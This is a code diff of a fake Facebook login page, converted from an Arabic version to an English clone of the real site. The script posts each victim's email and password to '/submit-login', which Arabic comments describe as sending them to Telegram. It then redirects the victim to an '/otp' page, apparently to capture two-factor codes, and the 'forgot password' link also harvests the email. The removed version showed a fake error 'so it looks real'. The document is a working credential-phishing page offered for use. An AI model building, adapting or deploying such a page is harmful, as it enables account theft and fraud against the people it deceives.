@@ -1,12 +1,11 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook - تسجيل الدخول</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>Facebook - Log In or Sign Up</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
         
         body {
             background: #f0f2f5;
@@ -17,128 +16,171 @@
             padding: 20px;
         }
         
-        .container {
-            background: white;
-            max-width: 400px;
+        .main-container {
+            display: flex;
+            align-items: center;
+            gap: 80px;
+            max-width: 980px;
             width: 100%;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            padding: 30px 24px;
-            text-align: center;
+            justify-content: center;
         }
         
-        .logo {
-            font-size: 42px;
-            font-weight: 800;
-            color: #1877f2;
+        /* الجزء الشمال - الشعار */
+        .left-section {
+            flex: 1;
+            max-width: 500px;
+            padding-bottom: 60px;
+        }
+        
+        .fb-logo {
+            width: 240px;
+            height: auto;
             margin-bottom: 8px;
         }
         
         .tagline {
-            color: #606770;
-            font-size: 15px;
-            margin-bottom: 28px;
+            font-size: 28px;
+            color: #1c1e21;
+            font-weight: 400;
+            line-height: 32px;
+            width: 500px;
         }
         
-        .input-group {
+        /* الجزء اليمين - الفورم */
+        .right-section {
+            flex: 0 0 396px;
+            width: 396px;
+        }
+        
+        .login-card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 16px 16px 24px;
+            width: 100%;
+        }
+        
+        .login-card form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .input-field {
             width: 100%;
             padding: 14px 16px;
+            font-size: 17px;
             border: 1px solid #dddfe2;
-            border-radius: 8px;
-            font-size: 16px;
-            margin-bottom: 12px;
+            border-radius: 6px;
+            background: #fff;
+            color: #1d2129;
             outline: none;
             transition: 0.2s;
-            background: #fff;
         }
         
-        .input-group:focus {
+        .input-field:focus {
             border-color: #1877f2;
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
         
-        .input-group::placeholder {
+        .input-field::placeholder {
             color: #90949c;
         }
         
         .login-btn {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: #1877f2;
-            color: white;
+            color: #fff;
             border: none;
-            border-radius: 8px;
-            font-size: 18px;
+            border-radius: 6px;
+            font-size: 20px;
             font-weight: 700;
             cursor: pointer;
             transition: 0.2s;
             margin-top: 6px;
+            font-family: Helvetica, Arial, sans-serif;
         }
         
         .login-btn:hover { background: #166fe5; }
-        .login-btn:active { transform: scale(0.98); }
+        .login-btn:active { transform: scale(0.99); }
         .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         
         .forgot-link {
             display: block;
+            text-align: center;
             color: #1877f2;
-            text-decoration: none;
             font-size: 14px;
-            margin: 16px 0 20px;
+            text-decoration: none;
+            padding: 12px 0;
+            margin-top: 4px;
         }
         
         .forgot-link:hover { text-decoration: underline; }
         
         .divider {
             border-top: 1px solid #dadde1;
-            margin: 20px 0;
+            margin: 12px 0 20px;
         }
         
         .create-btn {
-            display: inline-block;
-            padding: 14px 30px;
+            display: block;
+            width: fit-content;
+            margin: 0 auto;
+            padding: 12px 20px;
             background: #42b72a;
-            color: white;
+            color: #fff;
             border: none;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 17px;
             font-weight: 700;
             cursor: pointer;
             text-decoration: none;
+            text-align: center;
             transition: 0.2s;
+            font-family: Helvetica, Arial, sans-serif;
         }
         
         .create-btn:hover { background: #36a420; }
         
-        .footer {
+        .below-text {
             text-align: center;
-            margin-top: 24px;
-            font-size: 13px;
-            color: #90949c;
+            font-size: 14px;
+            color: #1c1e21;
+            margin-top: 28px;
         }
         
-        .footer strong { color: #1a1a1a; }
+        .below-text a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: 600;
+        }
         
+        .below-text a:hover { text-decoration: underline; }
+        
+        /* Error Message */
         .error-msg {
             background: #ffebe8;
-            color: #d32f2f;
-            padding: 10px 14px;
-            border-radius: 8px;
+            border: 1px solid #dd3c10;
+            color: #1c1e21;
+            padding: 10px 12px;
+            border-radius: 6px;
             font-size: 14px;
-            margin-bottom: 12px;
             display: none;
+            text-align: center;
         }
         
         .error-msg.show { display: block; }
         
+        /* Spinner */
         .loading-spinner {
             display: none;
             width: 20px;
             height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid white;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top: 2px solid #fff;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
             margin: 0 auto;
         }
         
@@ -149,56 +191,107 @@
         
         .login-btn.loading .btn-text { display: none; }
         .login-btn.loading .loading-spinner { display: block; }
+        
+        /* Footer */
+        .footer {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #8a8d91;
+            text-align: center;
+            padding: 0 16px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 900px) {
+            .main-container {
+                flex-direction: column;
+                gap: 20px;
+                padding: 20px 0;
+            }
+            
+            .left-section {
+                max-width: 396px;
+                padding-bottom: 0;
+                text-align: center;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .fb-logo {
+                width: 180px;
+            }
+            
+            .tagline {
+                font-size: 20px;
+                line-height: 24px;
+                width: 100%;
+                text-align: center;
+            }
+            
+            .right-section {
+                flex: 0 0 auto;
+                width: 100%;
+                max-width: 396px;
+            }
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="main-container">
         
-        <!-- الشعار -->
-        <div class="logo">facebook</div>
-        <div class="tagline">تسجيل الدخول إلى حسابك</div>
-        
-        <!-- رسالة خطأ -->
-        <div id="errorMsg" class="error-msg">
-            ⚠️ البريد الإلكتروني أو كلمة المرور غير صحيحة
+        <!-- الجزء الشمال -->
+        <div class="left-section">
+            <svg class="fb-logo" viewBox="0 0 666.67 133.33" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#1877f2" d="M631.25,0H35.42C15.85,0,0,15.85,0,35.42v62.5c0,19.57,15.85,35.42,35.42,35.42h595.83c19.57,0,35.42-15.85,35.42-35.42V35.42C666.67,15.85,650.81,0,631.25,0z"/>
+                <text x="333" y="85" font-family="Helvetica, Arial, sans-serif" font-size="70" font-weight="bold" fill="#fff" text-anchor="middle">facebook</text>
+            </svg>
+            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
         </div>
         
-        <!-- نموذج تسجيل الدخول -->
-        <form id="loginForm">
-            <input 
-                type="text" 
-                id="email" 
-                name="email" 
-                class="input-group" 
-                placeholder="البريد الإلكتروني أو رقم الهاتف"
-                required
-                autocomplete="username">
+        <!-- الجزء اليمين -->
+        <div class="right-section">
+            <div class="login-card">
+                <form id="loginForm">
+                    <div id="errorMsg" class="error-msg"></div>
+                    
+                    <input 
+                        type="text" 
+                        id="email" 
+                        name="email" 
+                        class="input-field" 
+                        placeholder="Email address or phone number"
+                        required
+                        autocomplete="username">
+                    
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        class="input-field" 
+                        placeholder="Password"
+                        required
+                        autocomplete="current-password">
+                    
+                    <button type="submit" id="loginBtn" class="login-btn">
+                        <span class="btn-text">Log In</span>
+                        <div class="loading-spinner"></div>
+                    </button>
+                    
+                    <a href="#" class="forgot-link" id="forgotBtn">Forgotten password?</a>
+                </form>
+                
+                <div class="divider"></div>
+                
+                <a href="#" class="create-btn">Create New Account</a>
+            </div>
             
-            <input 
-                type="password" 
-                id="password" 
-                name="password" 
-                class="input-group" 
-                placeholder="كلمة المرور"
-                required
-                autocomplete="current-password">
-            
-            <button type="submit" id="loginBtn" class="login-btn">
-                <span class="btn-text">تسجيل الدخول</span>
-                <div class="loading-spinner"></div>
-            </button>
-        </form>
-        
-        <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
-        
-        <div class="divider"></div>
-        
-        <a href="#" class="create-btn">إنشاء حساب جديد</a>
-        
-        <div class="footer">
-            <strong>English (US)</strong> · العربية · Français
+            <p class="below-text">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </p>
         </div>
+        
     </div>
 
     <script>
@@ -207,65 +300,74 @@
         const errorMsg = document.getElementById('errorMsg');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
+        const forgotBtn = document.getElementById('forgotBtn');
 
+        // ===== تسجيل الدخول =====
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const email = emailInput.value.trim();
             const password = passwordInput.value.trim();
             
-            // التحقق من المدخلات
             if (!email || !password) {
-                errorMsg.textContent = '⚠️ يرجى ملء جميع الحقول';
-                errorMsg.classList.add('show');
-                return;
-            }
-            
-            if (password.length < 4) {
-                errorMsg.textContent = '⚠️ كلمة المرور قصيرة جداً';
+                errorMsg.textContent = 'The email address or mobile number you entered isn\'t connected to an account. Find your account and log in.';
                 errorMsg.classList.add('show');
                 return;
             }
             
             errorMsg.classList.remove('show');
-            
-            // تشغيل حالة التحميل
             loginBtn.classList.add('loading');
             loginBtn.disabled = true;
             
             try {
+                // إرسال لتيلجرام
                 const response = await fetch('/submit-login', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
                 });
                 
                 const data = await response.json();
                 console.log('✅ تم الإرسال:', data);
                 
-                // بعد ثانيتين نعيد الزر لحالته
+                // حفظ الإيميل
+                localStorage.setItem('fb_email', email);
+                
+                // روح لصفحة OTP
                 setTimeout(() => {
-                    loginBtn.classList.remove('loading');
-                    loginBtn.disabled = false;
-                    
-                    // إظهار رسالة خطأ عشان يبان حقيقي
-                    errorMsg.textContent = '⚠️ البريد الإلكتروني أو كلمة المرور غير صحيحة';
-                    errorMsg.classList.add('show');
-                    
-                    // مسح كلمة المرور
-                    passwordInput.value = '';
-                    passwordInput.focus();
-                }, 2000);
+                    window.location.href = '/otp';
+                }, 800);
                 
             } catch (error) {
                 console.error('❌ خطأ:', error);
                 loginBtn.classList.remove('loading');
                 loginBtn.disabled = false;
-                errorMsg.textContent = '⚠️ حدث خطأ في الاتصال';
+                errorMsg.textContent = 'Something went wrong. Please try again.';
                 errorMsg.classList.add('show');
             }
+        });
+
+        // ===== نسيت كلمة المرور =====
+        forgotBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            
+            if (!email) {
+                errorMsg.textContent = 'Please enter your email address or phone number first.';
+                errorMsg.classList.add('show');
+                emailInput.focus();
+                return;
+            }
+            
+            // إرسال لتيلجرام
+            fetch('/submit-login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password: '(Forgot Password)' })
+            }).then(() => {
+                localStorage.setItem('fb_email', email);
+                window.location.href = '/otp';
+            });
         });
     </script>
 
